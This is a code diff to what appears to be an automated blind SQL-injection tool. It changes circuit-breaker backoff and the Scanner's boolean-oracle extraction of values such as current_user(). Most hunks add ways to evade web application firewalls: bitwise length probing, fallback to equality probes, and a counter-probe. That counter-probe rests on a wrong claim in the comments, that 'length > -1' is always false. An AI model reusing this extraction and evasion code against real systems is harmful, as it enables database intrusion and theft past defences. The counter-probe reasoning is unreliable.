@@ -32260,6 +32260,7 @@ class GlobalRequestGate:
         self._waf_boolean_killed = False  # True = boolean disabled by correlation
         self._circuit_open = False   # True = halt ALL requests (IP banned/server down)
         self._circuit_open_since = 0.0
+        self._circuit_trip_count = 0  # BUG-CB-PROGRESSIVE-BACKOFF FIX: count trips for escalating pause
         # RPM limiter  proactive rate control
         self._rpm_limit = rpm_limit
         self._rpm_timestamps: collections.deque = collections.deque(maxlen=rpm_limit + 50)
@@ -32524,6 +32525,7 @@ class GlobalRequestGate:
                     if not self._circuit_open:
                         self._circuit_open = True
                         self._circuit_open_since = time.monotonic()
+                        self._circuit_trip_count += 1  # BUG-CB-PROGRESSIVE-BACKOFF FIX: track cumulative trips
                         # BUG-CB-COUNTER-RESET FIX: reset counter to threshold on first open so
                         # probe failures (during recovery window) don't inflate it unboundedly.
                         self._consecutive_fail = _cb_threshold
@@ -32537,7 +32539,14 @@ class GlobalRequestGate:
                         # _paused_until/print block inside `if not self._circuit_open:`
                         # ensures the 60–300s pause is measured from the FIRST open and
                         # is not extended by subsequent errors from already-in-flight tasks.
-                        _extra = max(0, (self._consecutive_fail - _cb_threshold) // 5) * 30
+                        # BUG-CB-PROGRESSIVE-BACKOFF FIX: Previously _extra was computed as
+                        # max(0, (self._consecutive_fail - _cb_threshold) // 5) * 30, but
+                        # self._consecutive_fail was just reset to _cb_threshold, making
+                        # (_consecutive_fail - _cb_threshold) always 0 → _extra always 0 →
+                        # pause always ~70s regardless of how many times the circuit has tripped.
+                        # Fix: use _circuit_trip_count for progressive escalation.
+                        # Trip 1: +0s (60s), Trip 2-3: +60s (120s), Trip 4-5: +120s (180s), capped at 300s.
+                        _extra = max(0, (self._circuit_trip_count - 1) // 2) * 60
                         _pause = min(300, 60 + _extra + random.uniform(0, 15))
                         self._paused_until = time.monotonic() + _pause
                         print(f"[!] [Gate]  CIRCUIT BREAKER OPEN  {self._consecutive_fail} consecutive errors  "
@@ -63161,9 +63170,25 @@ class Scanner:
                 # NOT < are WAF-blocked), _get_length_fast and _get_length both use
                 # _len_tpl which relies on > or BETWEEN — the same WAF-blocked operators.
                 else:
-                    LOG.warning("[Inference] %s: oracle dead (returned -1 for both length methods), "
-                                "aborting extraction", label)
-                    return ""
+                    # BUG-LENGTH-DEAD-FALLBACK FIX: comparison-operator length detection returned -1
+                    # (WAF blocks > and BETWEEN in _len_tpl for this specific query). Try bitwise
+                    # length detection which uses only & and = operators — WAFs typically only
+                    # block comparison operators, not equality or bitwise AND in length expressions.
+                    # This rescues extractions like r7_user where current_user() length probes with
+                    # `>` are WAF-blocked but `&` and `=` probes pass through.
+                    LOG.warning("[Inference] %s: comparison-operator length probes returned -1 — "
+                                "trying bitwise length detection (& and = operators only)", label)
+                    try:
+                        _length = await _get_length_bitwise(query, max_bits=10)
+                        if _length > 0:
+                            LOG.info("[Inference] %s: bitwise length=%d (rescued from -1 dead oracle)", label, _length)
+                        else:
+                            LOG.warning("[Inference] %s: bitwise length also dead — "
+                                        "aborting extraction", label)
+                            return ""
+                    except Exception as _bwl_dead_e:
+                        LOG.debug("[Inference] %s: bitwise length error: %s — aborting", label, _bwl_dead_e)
+                        return ""
             if _length > 0:
                 # BUG-EXTRACT-STRING-MAXLEN-CAP FIX: The original guard was:
                 #   if _length >= max_len and max_len >= 64: cap to 32
@@ -63281,11 +63306,26 @@ class Scanner:
                         _over_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid))
                         _oracle_beyond = await _eval_confirm(_over_cond)  # Use confirmation for reliability
                         if _oracle_beyond is True:
-                            # Oracle claims length > max_len → definitely stuck at ceiling
-                            LOG.warning("[Inference] %s: length=%d hit max_len ceiling and "
-                                        "oracle confirms beyond-ceiling → oracle unreliable, "
-                                        "capping at 32", label, _length)
-                            _length = 32  # reasonable cap for db/user/version values
+                            # BUG-SERIAL-CEILING-WAF-COUNTER-FIX: _over_cond uses _len_tpl with `>`
+                            # or BETWEEN operator. If WAF blocks ALL comparison probes uniformly,
+                            # _eval_confirm returns True regardless of actual string length →
+                            # incorrect cap to 32. Counter-probe: check length > -1 (always
+                            # SQL-false: lengths are ≥ 0). WAF-uniform blocking → counter also True.
+                            _serial_counter_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(-1))
+                            _serial_counter_r = await _eval(_serial_counter_cond)
+                            if _serial_counter_r is True:
+                                LOG.warning(
+                                    "[Inference] %s: serial ceiling probe True but counter-probe "
+                                    "(len>-1) also True — WAF uniformly blocking length comparison "
+                                    "operator; ceiling probe unreliable — keeping length=%d",
+                                    label, _length)
+                                # Don't cap: WAF-uniform → ceiling probe is noise.
+                            else:
+                                # Oracle claims length > max_len → definitely stuck at ceiling
+                                LOG.warning("[Inference] %s: length=%d hit max_len ceiling and "
+                                            "oracle confirms beyond-ceiling → oracle unreliable, "
+                                            "capping at 32", label, _length)
+                                _length = 32  # reasonable cap for db/user/version values
                         else:
                             # Oracle says NOT beyond max_len → real boundary, keep max_len
                             LOG.info("[Inference] %s: length=%d equals max_len but oracle "
@@ -64471,6 +64511,7 @@ class Scanner:
                         break
                     ch = _bf_direct
                 else:
+                  _bisect_consec_true = 0  # BUG-BISECT-WAF-UNIFORM-FIX: track consecutive True results per position
                   while lo < hi:
                     # BUG-V164-INFERENCE-BISECT-EXTRACT-FIXED-PIVOT FIX (MEDIUM, all 5 DBMSes):
                     # Fixed pivot mid=(lo+hi)//2 in _extract_string bisection makes
@@ -64513,8 +64554,25 @@ class Scanner:
 
                     if _is_true:
                         lo = mid + 1
+                        _bisect_consec_true += 1
+                        # BUG-BISECT-WAF-UNIFORM-FIX: when the oracle returns True for every
+                        # bisection probe, lo races from 0 toward _bisect_char_hi (1,114,111 for
+                        # MySQL) producing supplementary-plane garbage (U+10XXXX). This happens when
+                        # WAF blocks ALL comparison-operator SQL for this specific query/param
+                        # combination (returns 403/True signal uniformly). Detect it early:
+                        # after 6+ consecutive True results with lo already past ASCII/Latin range
+                        # (>10000), abort to equality fallback which uses only the = operator
+                        # (WAFs are much less likely to block equality probes uniformly).
+                        if _bisect_consec_true >= 6 and lo > 10000:
+                            LOG.warning(
+                                "[Inference] %s[%d] bisection WAF-uniform suspected: lo=%d after "
+                                "%d consecutive True results — comparison oracle blocked, "
+                                "aborting to equality fallback",
+                                label, pos, lo, _bisect_consec_true)
+                            break  # lo != hi → post-bisect guard fires → equality fallback
                     else:
                         hi = mid
+                        _bisect_consec_true = 0  # BUG-BISECT-WAF-UNIFORM-FIX: reset on any False
                     await _smart_sleep(_is_true)
 
                 if not _skip_bisect:
@@ -65607,10 +65665,30 @@ class Scanner:
                     _over_cond_par = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid_par))
                     _oracle_beyond_par = await _eval_confirm(_over_cond_par)
                     if _oracle_beyond_par is True:
-                        LOG.warning("[Inference] %s: length=%d hit max_len ceiling (parallel) "
-                                    "oracle confirms beyond-ceiling → oracle unreliable, capping at 32",
-                                    label, _length)
-                        _length = 32
+                        # BUG-PAR-CEILING-WAF-COUNTER-FIX: _over_cond_par uses _len_tpl which
+                        # contains a `>` or BETWEEN operator. If WAF blocks ALL comparison probes
+                        # for this query uniformly, _eval_confirm returns True even though the
+                        # string is not genuinely beyond max_len — causing incorrect cap to 32.
+                        # Counter-probe: check length > -1 (always SQL-false, length ≥ 0 always).
+                        # If WAF blocks uniformly, the counter also returns True → oracle is broken.
+                        # If the counter correctly returns False → the beyond-ceiling probe is real.
+                        _counter_cond_par = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(-1))
+                        _counter_par_r = await _eval(_counter_cond_par)
+                        if _counter_par_r is True:
+                            LOG.warning(
+                                "[Inference] %s: parallel ceiling probe True but counter-probe "
+                                "(len>-1) also True — WAF uniformly blocking length comparison "
+                                "operator for this query; ceiling probe is not reliable — "
+                                "keeping length=%d (not capping to 32)",
+                                label, _length)
+                            # Do not cap: WAF-uniform blocking means the probe is meaningless.
+                            # Let extraction proceed using _length (or max_len if inflated).
+                            # The bisection WAF-uniform guard will catch garbage mid-extraction.
+                        else:
+                            LOG.warning("[Inference] %s: length=%d hit max_len ceiling (parallel) "
+                                        "oracle confirms beyond-ceiling → oracle unreliable, capping at 32",
+                                        label, _length)
+                            _length = 32
                     else:
                         LOG.info("[Inference] %s: length=%d equals max_len (parallel) — confirmed true length",
                                  label, _length)
